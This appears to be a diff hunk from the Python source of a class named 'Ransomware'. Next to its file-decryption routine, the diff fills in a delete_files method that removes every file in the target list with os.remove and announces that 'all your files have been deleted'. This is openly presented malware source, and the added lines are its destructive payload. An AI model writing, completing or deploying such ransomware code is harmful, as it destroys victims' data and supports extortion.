@@ -28,7 +28,8 @@ class Ransomware:
         print("all your files have been decrypted!\ngoodbye!")
 
     def delete_files(self):
-        pass
+        [os.remove(file) for file in self.files]
+        print("all your files have been deleted!\ngoodbye!")
 
 
 if __name__ == "__main__":
